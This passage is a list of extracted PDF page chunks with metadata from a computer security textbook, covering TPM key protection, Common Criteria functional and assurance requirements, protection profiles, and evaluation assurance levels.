particular software state in a platform. When the TPM protected \\nobject is created, the creator indicates the software state that must exist if the secret \\nis to be revealed. When a TPM unwraps the TPM protected object (within the TPM \\nand hidden from view), the TPM checks that the current software state matches the \\nindicated software state. If they match, the TPM permits access to the secret. If they \\ndo not match, the TPM denies access to the secret.\\nFigure 27.12 provides an example of this protection. In this case, there is an \\nencrypted file on local storage that a user application wishes to access. The following \\nsteps occur:\\n1. The symmetric k\\ney that was used to encrypt the file is stored with the file. \\nThe key itself is encrypted with another key to which the TPM has access. The \\nprotected key is submitted to the TPM with a request to reveal the key to the \\napplication.\\nM27_STAL0611_04_GE_C27.indd   30 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 884, 'page_label': '27-31'}, page_content='27.6 / CoMMon CRiTERiA FoR inFoRMATion TECHnology SECuRiTy EvA luA T ion  27-31\\n2. Associated with the protected key is a specification of the hardware/  softwar e \\n c\\nonfiguration that may have access to the key. The TPM verifies that the \\ncurrent configuration matches the configuration required for revealing \\nthe key. In addition, the requesting application must be specifically autho-\\nrized to access the key. The TPM uses an authorization protocol to verify \\nauthorization.\\n3.\\n If the curr\\nent configuration is permitted access to the protected key, then the TPM \\ndecrypts the key and passes it on to the application.\\n4.\\n T\\nhe application uses the key to decrypt the file. The application is trusted to \\nthen securely discard the key.\\nThe encryption of a file proceeds in an analogous matter. In this latter case, \\na process requests a symmetric key to encrypt the file. The TPM then provides an \\nencrypted version of the key to be stored with the file.\\n 27. 6  COMMON CRITERIA FOR INFORMA TION TECHNOLOGY \\nSECURITY EVALUATION\\nThe work done by the National Security Agency and other U.S. government agen-\\ncies to develop requirements and evaluation criteria for trusted systems resulted \\nin the publication of the Trusted Computer System Evaluation Criteria (TCSEC), \\nFigure 27.12 Decrypting a File Using a Pr otected Key\\n1. Loading of\\nencrypted key\\nProtected\\nsymmetric\\nkey\\nSymmetric\\nkey\\n4. File\\nreleased\\n3. Key\\nreleased\\n2. Veriﬁcation\\nTPM\\nEncrypted\\nﬁle\\nStorage\\nDecrypted\\nﬁle\\nUser application\\n(performs\\ndecryption)\\nCurrent\\nplatform\\nsoftware\\nenvironment\\nM27_STAL0611_04_GE_C27.indd   31 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 885, 'page_label': '27-32'}, page_content='27-32  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\ninformally known as the Orange Book, in the early 1980s. This focused primarily on \\nprotecting information confidentiality. Subsequently, other countries started work \\nto develop criteria based on the TCSEC that were more flexible and adaptable to \\nthe evolving nature of IT. The process of merging, extending, and consolidating these \\nvarious efforts eventually resulted in the development of the Common Criteria in \\nthe late 1990s. The Common Criteria (CC) for Information Technology and Secu-\\nrity Evaluation are ISO standards for specifying security requirements and defining \\nevaluation criteria. The aim of these standards is to provide greater confidence in \\nthe security of IT products as a result of formal actions taken during the process \\nof developing, evaluating, and operating these products. In the development stage, \\nthe CC defines sets of IT requirements of known validity that can be used to estab-\\nlish the security requirements of prospective products and systems. Then the CC \\ndetails how a specific product can be evaluated against these known requirements, \\nto provide confirmation that it does indeed meet them, with an appropriate level \\nof confidence. Lastly, when in operation the evolving IT environment may reveal \\nnew vulnerabilities or concerns. The CC details a process for responding to such \\nchanges, and possibly reevaluating the product. Following successful evaluation, a \\nparticular product may be listed as CC certified or validated by the appropriate \\nnational agency, such as NIST/NSA in the United States. That agency publishes lists \\nof evaluated products, which are used by government and industry purchasers who \\nneed to use such products.\\nRequirements\\nThe CC defines a common set of potential security requirements for use in evalua-\\ntion. The term target of evaluation (TOE) refers to that part of the product or system \\nthat is subject to evaluation. The requirements fall into two categories:\\n1.\\n F\\nunctional requirements: Define desired security behavior. CC documents \\nestablish a set of security functional components that provide a standard way \\nof expressing the security functional requirements for a TOE.\\n2.\\n Assurance r\\nequirements: The basis for gaining confidence that the claimed \\nsecurity measures are effective and implemented correctly. CC documents \\nestablish a set of assurance components that provide a standard way of express-\\ning the assurance requirements for a TOE.\\nBoth functional requirements and assurance requirements are organized into \\nclasses: A class is a collection of requirements that share a common focus or intent. \\nTables 27.3 and 27.4 briefly define the classes for functional and assurance require-\\nments. Each of these classes contains a number of families. The requirements within \\neach family share security objectives, but differ in emphasis or rigor. For example, \\nthe audit class contains six families dealing with various aspects of auditing (e.g., \\naudit data generation, audit analysis and audit event storage). Each family, in turn, \\ncontains one or more components. A component describes a specific set of security \\nrequirements and is the smallest selectable set of security requirements for inclusion \\nin the structures defined in the CC.\\nM27_STAL0611_04_GE_C27.indd   32 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 886, 'page_label': '27-33'}, page_content='27.6 / CoMMon CRiTERiA FoR inFoRMATion TECHnology SECuRiTy EvA luA T ion  27-33\\nClass Description\\nAudit Involves recognizing, recording, storing, and analyzing information related to security \\nactivities. Audit records are produced by these activities and can be examined to deter-\\nmine their security relevance.\\nCryptographic \\nsupport\\nUsed when the TOE implements cryptographic functions. These may be used, for \\n example\\n, to support communications, identification and authentication, or data \\nseparation.\\nCommunications Provides two families concerned with nonrepudiation by the originator and by the \\n r\\necipient of data.\\nUser data \\nprotection\\nSpecifies requirements relating to the protection of user data within the TOE during \\nimport, export, and storage, in addition to security attributes related to user data.\\nIdentification and \\nauthentication\\nEnsure the unambiguous identification of authorized users and the correct \\n association \\n \\nof security attributes with users and subjects.\\nSecurity \\nmanagement\\nSpecifies the management of security attributes, data, and functions.\\nPrivacy Provides a user with protection against discovery and misuse of his or her \\n identity by \\nother users\\n.\\nProtection of the \\nTOE security \\nfunctions\\nFocused on protection of TSF (TOE security functions) data rather than of user data. \\nThe class relates to the integrity and management of the TSF mechanisms and data.\\nResource \\nutilization\\nSupports the availability of required resources, such as processing capability and \\n stor\\nage \\ncapacity. Includes requirements for fault tolerance, priority of service, and resource \\nallocation.\\nTOE access Specifies functional requirements, in addition to those specified for \\n identification and \\nauthentication,\\n for controlling the establishment of a user’s session. The requirements \\nfor TOE access govern such things as limiting the number and scope of user sessions, \\n displa\\nying the access history, and modifying access parameters.\\nTrusted path/\\nchannels\\nConcerned with trusted communications paths between the users and the TSF and \\nbetween TSFs.\\nTable 27.3  CC Security F unctional Requirements\\nFor example, the cryptographic support class of functional requirements \\nincludes two families: cryptographic key management, and cryptographic operation. \\nThere are four components under the cryptographic key management family, which \\nare used to specify key generation algorithm and key size; key distribution method; \\nkey access method; and key destruction method. For each component, a standard \\nmay be referenced to define the requirement. Under the cryptographic operation \\nfamily, there is a single component, which specifies an algorithm and key size based \\non an assigned standard.\\nSets of functional and assurance components may be grouped together into \\nreusable packages, which are known to be useful in meeting identified objectives. An \\nexample of such a package would be functional components required for Discretion-\\nary Access Controls.\\nM27_STAL0611_04_GE_C27.indd   33 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 887, 'page_label': '27-34'}, page_content='27-34  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nProfiles and Targets\\nThe CC also defines two kinds of documents that can be generated using the \\n CC-defined \\nrequirements.\\n•\\n Pr\\notection profiles (PPs): Define an implementation-independent set of \\n security r\\nequirements and objectives for a category of products or sys-\\ntems that meet similar consumer needs for IT security. A PP is intended \\nto be reusable and to define requirements that are known to be useful and \\neffective in meeting the identified objectives. The PP concept has been \\ndeveloped to support the definition of functional standards and as an aid \\nto formulating procurement specifications. The PP reflects user security \\nrequirements.\\nClass Description\\nConfiguration \\nmanagement\\nRequires that the integrity of the TOE is adequately preserved. Specifically, \\n configur\\nation management provides confidence that the TOE and documentation \\nused for evaluation are the ones prepared for distribution.\\nDelivery and \\noperation\\nConcerned with the measures, procedures, and standards for secure delivery, \\n installation,\\n and operational use of the TOE, to ensure that the security protection \\noffered by the TOE is not compromised during these events.\\nDevelopment Concerned with the refinement of the TSF from the specification defined in the ST to \\nthe implementation, and a mapping from the security requirements to the lowest level \\nrepresentation.\\nGuidance  \\ndocuments\\nConcerned with the secure operational use of the TOE, by the users and \\nadministrators.\\nLife cycle support Concerned with the life cycle of the TOE include life cycle definition, tools and \\n techniques\\n, security of the development environment, and remediation of flaws found \\nby TOE consumers.\\nTests Concerned with demonstrating that the TOE meets its functional requirements. The \\nfamilies address coverage and depth of developer testing, and requirements for inde-\\npendent testing.\\nVulnerability \\nassessment\\nDefines requirements directed at the identification of exploitable \\n vulner\\nabilities, \\nwhich could be introduced by construction, operation, misuse, or incorrect \\n configur\\nation of the TOE. The families identified here are concerned with \\n identifying \\nvulner\\nabilities through covert channel analysis, analyzing the configuration of the \\nTOE, examining the strength of mechanisms of the security functions, and identify-\\ning flaws introduced during development of the TOE. The second family covers the \\nsecurity categorization of TOE components. The third and fourth cover the analysis \\nof changes for security impact and the provision of evidence that procedures are \\nbeing followed. This class provides building blocks for the establishment of assurance \\n maintenance \\nschemes.\\nAssurance \\nmaintenance\\nProvides requirements that are intended to be applied after a TOE has been \\n certified\\xa0against the CC\\n. These requirements are aimed at assuring that the TOE \\nwill continue to meet its security target as changes are made to the TOE or its \\nenvironment.\\nTable 27.4  CC Security Assurance Requirements\\nM27_STAL0611_04_GE_C27.indd   34 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 888, 'page_label': '27-35'}, page_content='27.6 / CoMMon CRiTERiA FoR inFoRMATion TECHnology SECuRiTy EvAluATion  27-35\\n• Security targets (STs): Contain the IT security objectives and requirements of \\na specific identified TOE and defines the functional and assurance measures \\noffered by that TOE to meet stated requirements. The ST may claim confor-\\nmance to one or more PPs and forms the basis for an evaluation. The ST is \\nsupplied by a vendor or developer.\\nFigure 27.13 illustrates the relationship between requirements on the one hand \\nand profiles and targets on the other. For a PP , a user can select a number of compo-\\nnents to define the requirements for the desired product. The user may also refer to \\npredefined packages that assemble a number of requirements commonly grouped \\ntogether within a product requirements document. Similarly, a vendor or designer \\ncan select a number of components and packages to define an ST.\\nFigure 27.14 shows what is referred to in the CC documents as the security func-\\ntional requirements paradigm. In essence, this illustration is based on the reference \\nmonitor concept but makes use of the terminology and design philosophy of the CC.\\nExample of a Protection Profile\\nThe protection profile for a smart card, developed by the Smart Card Security User \\nGroup, provides a simple example of a PP . This PP describes the IT security require-\\nments for a smart card to be used in connection with sensitive applications, such \\nas banking industry financial payment systems. The assurance level for this PP is \\nEAL\\xa04, which is described in the following subsection. The PP lists threats that must \\nbe addressed by a product that claims to comply with this PP . The threats include the \\nfollowing:\\n• Physic\\nal probing: May entail reading data from the TOE through techniques \\ncommonly employed in IC failure analysis and IC reverse engineering efforts.\\n• Inv\\nalid input: Invalid input may take the form of operations that are not for -\\nmatted correctly, requests for information beyond register limits, or attempts \\nto find and execute undocumented commands. The result of such an attack  \\nFigure 27.13 Organization and Construction of Common Criteria Requir ements\\nFamily j Component\\nComponent\\nComponent\\nComponent\\nComponent\\nComponent\\nComponent\\nComponent\\nComponent\\nPACKAGES\\nReusable set of functional or\\nassurance requirements.\\nOptional input to PP or ST\\nCLASS b\\nCLASS a\\nPROTECTION PROFILE\\nPossible input\\nsources for PP\\nSECURITY TARGET\\nPossible input\\nsources for ST\\nOptional extended (non-CC)\\nsecurity requirements\\n...\\n...\\n...\\nFamily j\\nFamily k\\nM27_STAL0611_04_GE_C27.indd   35 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 889, 'page_label': '27-36'}, page_content='27-36  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nmay be a compromise in the security functions, generation of exploitable errors \\nin operation, or release of protected data.\\n•\\n Linkage of multiple operations:\\n An attacker may observe multiple uses of \\nresources or services and, by linking these observations, deduce information \\nthat that may reveal security function data.\\nFollowing a list of threats, the PP turns to a description of security objectives. \\nThese reflect the stated intent to counter identified threats and/or comply with any \\norganizational security policies identified. Nineteen objectives are listed, including \\nthe following:\\n•\\n A\\nudit: The system must provide the means of recording selected security-  \\nr\\nelevant events, so as to assist an administrator in the detection of potential \\nattacks or misconfiguration of the system security features that would leave it \\nsusceptible to attack.\\n•\\n F\\nault insertion: The system must be resistant to repeated probing through \\n insertion of err\\noneous data.\\n•\\n Information leakage:\\n The system must provide the means of controlling and \\nlimiting the leakage of information in the system so no useful information is \\nrevealed over the power, ground, clock, reset, or I/O lines.\\nFigure 27.14 Security F unctional Requirements Paradigm\\nSecurity\\nattributes\\nSecurity\\nattributes\\nSecurity\\nattributes\\nSecurity\\nattributes\\nSecurity\\nattributes\\nProcessResource\\nTSF scope of control (TSC)\\nObject/\\nInformation\\nSubject\\nUser\\nHuman\\nuser/\\nremote IT\\nproduct\\nSubject\\nSubject\\nSubject\\nTOE security functions\\n(TSF)\\nEnforces TOE Security Policy\\n(TSP)\\nTarget of evaluation (TOE) TOE security functions interface (TSFI)\\nM27_STAL0611_04_GE_C27.indd   36 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 890, 'page_label': '27-37'}, page_content='27.7 / ASSuRAnCE And EvAluATion  27-37\\nSecurity requirements are provided to thwart specific threats and to support \\nspecific policies under specific assumptions. The PP lists specific requirements in \\nthree general areas: TOE security functional requirements, TOE security assur -\\nance requirements, and security requirements for the IT environment. In the \\narea of security functional requirements, the PP defines 42 requirements from \\nthe available classes of security functional requirements (see Table 27.3). For \\nexample, for security auditing, the PP stipulates what the system must audit; \\nwhat information must be logged; what the rules are for monitoring, operating \\nand protecting the logs; and so on. Functional requirements are also listed from \\nthe other functional requirements classes, with specific details for the smart card \\noperation.\\nThe PP defines 24 security assurance requirements from the available classes of \\nsecurity assurance requirements (see \\nTable 27.4). These requirements were chosen \\nto demonstrate:\\n• The quality of the pr\\noduct design and configuration\\n• That adequate pr\\notection is provided during the design and implementation \\nof the product\\n• That vendor testing of the pr\\noduct meets specific parameters\\n• That security functionality is not compr\\nomised during product delivery\\n• That user guidance\\n, including product manuals pertaining to installation, \\n maintenance and use,\\n are of a specified quality and appropriateness\\nThe PP also lists security requirements of the IT environment. These cover the \\nfollowing topics:\\n• Cryptographic k\\ney distribution\\n• Cryptographic k\\ney destruction\\n• Security roles\\nT\\nhe final section of the PP (excluding appendices) is a lengthy rationale for all \\nof the selections and definitions in the PP . The PP is an industry-wide effort designed \\nto be realistic in its ability to be met by a variety of products with a variety of internal \\nmechanisms and implementation approaches.\\n 27.7 ASSURANCE AND EVALU ATION\\nAssurance may be defined as a measure of confidence that the security features and \\narchitecture of an information system (IS) accurately mediate and enforce security \\npolicy. If the security features of an IS are relied on to protect classified or sensitive \\ninformation and restrict user access, the features must be tested to ensure that the \\nsecurity policy is enforced. As with any other aspect of computer security, resources \\ndevoted to assurance must be subjected to some sort of cost-benefit analysis to deter-\\nmine what amount of effort is reasonable for the level of assurance desired.\\nM27_STAL0611_04_GE_C27.indd   37 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 891, 'page_label': '27-38'}, page_content='27-38  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nTarget Audience\\nThe design of assurance measures depends in part on the target audience for these \\nmeasures. That is, in developing a degree of confidence in security measures, we need \\nto specify what individuals or groups possess that degree of confidence. The CC \\n document on assur\\nance [CCPS12] lists the following target audiences:\\n•\\n Consumers:\\n Select security features and functions for a system and determine \\nthe required levels of security assurance.\\n•\\n De\\nvelopers: Respond to actual or perceived consumer security requirements; \\ninterpret statements of assurance requirements; and determine assurance \\napproaches and level of effort.\\n•\\n Ev\\naluators: Use the assurance requirements as a mandatory statement of \\n ev\\naluation criteria when evaluating security features and controls.\\nEvaluators may be in the same organization as consumers or a third-party \\nevaluation team.\\nScope of Assurance\\nAssurance deals with security features of IT products, such as computers, database \\nmanagement systems, operating systems, and complete systems. Assurance applies to \\nthe following aspects of a system:\\n•\\n R\\nequirements:  This category refers to the security requirements for a product\\n•\\n Security policy:\\n Based on the requirements, a security policy can be defined\\n•\\n Pr\\noduct design: Based on requirements and security policy\\n•\\n Pr\\noduct implementation: Based on design\\n•\\n S\\nystem operation: Includes ordinary use plus maintenance\\nIn each area, various approaches can be taken to provide assurance. [CCPS12] \\nlists the following possible approaches:\\n•\\n Analysis and checking of pr\\nocess(es) and procedure(s)\\n•\\n Checking that pr\\nocess(es) and procedure(s) are being applied\\n•\\n Analysis of the corr\\nespondence between TOE design representations\\n•\\n Analysis of the \\nTOE design representation against the requirements\\n•\\n V\\nerification of proofs\\n•\\n Analysis of guidance documents\\n•\\n Analysis of functional tests developed and the r\\nesults provided\\n•\\n Independent functional testing\\n•\\n Analysis for vulner\\nabilities (including flaw hypothesis)\\n•\\n P\\nenetration testing\\nA somewhat different take on the elements of assurance is provided in \\n[CHOK92]. This report is based on experience with Orange Book evaluations but is \\nM27_STAL0611_04_GE_C27.indd   38 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 892, 'page_label': '27-39'}, page_content='27.7 / ASSuRAnCE And EvA luA T ion  27-39\\nrelevant to current trusted product development efforts. The author views assurance \\nas encompassing the following requirements:\\n•\\n S\\nystem architecture: Addresses both the system development phase and the \\n system oper\\nations phase. Examples of techniques for increasing the level of \\nassurance during the development phase include modular software design, \\n la\\nyering, and data abstraction/information hiding. An example of the opera-\\ntions phase is isolation of the trusted portion of the system from user processes.\\n•\\n S\\nystem integrity: Addresses the correct operation of the system hardware and \\nfirmware and is typically satisfied by periodic use of diagnostic software.\\n•\\n S\\nystem testing: Ensures that the security features have been tested thoroughly. \\nThis includes testing of functional operations, testing of security requirements, \\nand testing of possible penetrations.\\n•\\n Design specific\\nation and verification: Addresses the correctness of the system \\ndesign and implementation with respect to the system security policy. Ideally, \\nformal methods of verification can be used.\\n•\\n Co\\nvert channel analysis: This type of analysis attempts to identify any poten-\\ntial means for bypassing security policy and ways to reduce or eliminate such \\npossibilities.\\n•\\n T\\nrusted facility management: Deals with system administration. One approach \\nis to separate the roles of system operator and security administrator. Another \\napproach is detailed specification of policies and procedures with mechanisms \\nfor review.\\n•\\n T\\nrusted recovery: Provides for correct operation of security features after a \\nsystem recovers from failures, crashes, or security incidents.\\n•\\n T\\nrusted distribution: Ensures that protected hardware, firmware, and software \\ndo not go through unauthorized modification during transit from the vendor \\nto the customer.\\n•\\n Configuration management:\\n Requirements are included for configuration \\n contr\\nol, audit, management, and accounting.\\nThus, we see assurance deals with the design, implementation, and operation \\nof protected resources and their security functions and procedures. It is important \\nto note that assurance is a process, not an attainment. That is, assurance must be an \\nongoing activity, including testing, auditing, and review.\\nCommon Criteria Evaluation Assurance Levels\\nThe concept of evaluation assurance is a difficult one to pin down. Further, the degree \\nof assurance required varies from one context and one functionality to another. To \\nstructure the need for assurance, the CC defines a scale for rating assurance consisting \\nof seven evaluation assurance levels (EALs) ranging from the least rigor and scope \\nfor assurance evidence (EAL 1) to the most (EAL 7). The levels are as follows:\\n•\\n EAL\\n 1: functionally tested: For environments where security threats are not \\nconsidered serious. It involves independent product testing with no input from \\nM27_STAL0611_04_GE_C27.indd   39 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 893, 'page_label': '27-40'}, page_content='27-40  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nthe product developers. The intent is to provide a level of confidence in correct \\noperation.\\n•\\n EAL\\n 2: structurally tested: Includes a review of a high-level design provided \\nby the product developer. Also, the developer must conduct a vulnerability \\nanalysis for well-known flaws. The intent is to provide a low to moderate level \\nof independently assured security.\\n•\\n E\\nAL 3: methodically tested and checked:  Requires a focus on the security \\nfeatures. This includes requirements that the design separate security-related \\ncomponents from those that are not; that the design specifies how security is \\nenforced; and that testing be based both on the interface and the high-level \\ndesign, rather than a black-box testing based only on the interface. It is appli-\\ncable where the requirement is for a moderate level of independently assured \\nsecurity, with a thorough investigation of the TOE and its development without \\nincurring substantial reengineering costs.\\n•\\n EAL\\n 4: methodically designed, tested, and reviewed: Requires a low-level as \\nwell as a high-level design specification. Requires the interface specification \\nbe complete. Requires an abstract model that explicitly defines security for \\nthe product. Requires an independent vulnerability analysis. It is applicable \\nin those circumstances where developers or users require a moderate to high \\nlevel of independently assured security in conventional \\n commodity \\nTOEs, \\nand there is willingness to incur some additional security-specific \\n engineering\\n \\ncosts.\\n•\\n EAL\\n 5: semiformally designed and tested: Provides an analysis that includes \\nall of the implementation. Assurance is supplemented by a formal model and \\na semiformal presentation of the functional specification and high-level design \\nand a semiformal demonstration of correspondence. The search for vulnera-\\nbilities must ensure resistance to penetration attackers with a moderate attack \\npotential. Covert channel analysis and modular design are also required.\\n•\\n EAL\\n 6: semiformally verified design and tested: Permits a developer to gain \\nhigh assurance from application of specialized security engineering techniques \\nin a rigorous development environment, and to produce a premium TOE for \\nprotecting high value assets against significant risks. The independent search \\nfor vulnerabilities must ensure resistance to penetration attackers with a high \\nattack potential.\\n•\\n EAL\\n 7: formally verified design and tested: The formal model is supplemented \\nby a formal presentation of the functional specification and high level design, \\nshowing correspondence. Evidence of developer “white box” testing of internals \\nand complete independent confirmation of developer test results are required. \\nComplexity of the design must be minimized.\\nThe first four levels reflect various levels of commercial design practice. Only \\nat the highest of these levels (EAL 4) is there a requirement for any source code \\nanalysis, and this only for a portion of the code. The top three levels provide  specific\\n \\nguidance for products developed using security specialists and security-specific \\ndesign and engineering approaches.\\nM27_STAL0611_04_GE_C27.indd   40 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 894, 'page_label': '27-41'}, page_content='27.7 / ASSuRAnCE And EvA luA T ion  27-41\\nEvaluation Process\\nThe aim of evaluating an IT product, a TOE, against a trusted computing standard \\nis to ensure that the security features in the TOE work correctly and effectively, and \\nshow no exploitable vulnerabilities. The evaluation process is performed either in \\nparallel with, or after, the development of the TOE, depending on the level of assur-\\nance required. The higher the level, the greater the rigor needed by the process, and \\nthe more time and expense that it will incur. The principle inputs to the evaluation are \\nthe security target, a set of evidence about the TOE, and the actual TOE. The desired \\nresult of the evaluation process is to confirm that the security target is satisfied for the \\nTOE, confirmed by documented evidence in the technical evaluation report.\\nThe evaluation process will relate the security target to one or more of the high-\\nlevel design, low-level design, functional specification, source code implementation, \\nand object code and hardware realization of the TOE. The degree of rigor used, and \\nthe depth of analysis are determined by the assurance level desired for the evalua-\\ntion. At the higher levels, semiformal or formal models are used to confirm that the \\nTOE does indeed implement the desired security target. The evaluation process also \\ninvolves careful testing of the TOE to confirm it’s security features.\\nThe evaluation involves a number of parties:\\n•\\n Sponsor\\n: Usually either the customer or the vendor of a product for which \\nevaluation is required. Sponsors determine the security target that the product \\nhas to satisfy.\\n•\\n De\\nveloper: Has to provide suitable evidence on the processes used to design, \\nimplement, and test the product to enable its evaluation.\\n•\\n Ev\\naluator: Performs the technical evaluation work, using the evidence supplied \\nby the developers, and additional testing of the product, to confirm that it satis-\\nfies the functional and assurance requirements specified in the security target. \\nIn many countries, the task of evaluating products against a trusted computing \\nstandard is delegated to one or more endorsed commercial suppliers.\\n•\\n Certifier\\n: The government agency that monitors the evaluation process and subse-\\nquently certifies that a product has been successfully evaluated. Certifiers gener-\\nally manage a register of evaluated products, which can be consulted by customers.\\nThe evaluation process has three broad phases:\\n1.\\n Pr\\neparation: Involves the initial contact between the sponsor and developers of \\na product, and the evaluators who will assess it. It will confirm that the sponsor \\nand developers are adequately prepared to conduct the evaluation, and will \\ninclude a review of the security target and possibly other evaluation deliver-\\nables. It concludes with a list of evaluation deliverables and acceptance of the \\noverall project costing and schedule.\\n2.\\n Conduct of e\\nvaluation: A structured and formal process in which the evaluators \\nconduct a series of activities specified by the CC. These include reviewing the \\ndeliverables provided by the sponsor and developers, and other tests of the prod-\\nuct, to confirm it satisfies the security target. During this process, problems may be \\nidentified in the product, which are reported back to the developers for correction.\\nM27_STAL0611_04_GE_C27.indd   41 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 895, 'page_label': '27-42'}, page_content='27-42  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\n3. C onclusion:  The evaluators provide the final evaluation technical report to \\nthe certifiers for acceptance. The certifiers use this report, which may contain \\nconfidential information, to validate the evaluation process and to prepare a \\npublic certification report. The certification report is then listed on the relevant \\nregister of evaluated products.\\nThe evaluation process is normally monitored and regulated by a government agency \\nin each country. In the United States, the NIST and the NSA jointly operate the \\n Common Criteria Ev\\naluation and Validation Scheme (CCEVS). Many countries \\nsupport a peering arrangement, which allows evaluations performed in one country \\nto be recognized and accepted in other countries. Given the time and expense that \\nan evaluation incurs, this is an important benefit to vendors and consumers. The \\nCommon Criteria Portal provides further information on the relevant agencies and \\nprocesses used by participating countries.\\nBELL73 Bell, D., and LaPadula, L. “Secure Computer Systems: Mathematical \\n F\\noundations.” MTR-2547 , Vol. I, The MITRE Corporation, Bedford, MA, 